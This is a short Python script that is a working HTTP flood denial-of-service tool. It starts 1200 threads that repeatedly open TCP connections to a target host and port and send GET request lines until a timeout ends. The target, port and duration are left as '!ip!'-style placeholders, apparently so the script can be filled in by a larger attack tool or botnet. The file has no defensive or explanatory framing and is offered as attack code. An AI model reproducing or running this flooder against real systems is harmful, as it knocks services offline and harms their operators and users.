import socket, threading, time

__THREAD_NUMBER__ = 1200

def http_flood(ip: str, port: str, timeout: str):
    def flood(ip: str, port: int, timeout: int):
        start_time = int(time.time())

        while int(time.time()) - start_time < timeout:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((ip, port))
                
                for _ in range(50):
                    sock.send("GET / HTTP/1.1\r\n".encode())
            except:
                pass

    for _ in range(__THREAD_NUMBER__):
        threading.Thread(target= flood, args=(ip, int(port), int(timeout),)).start()

http_flood('!ip!', '!port!', '!time!')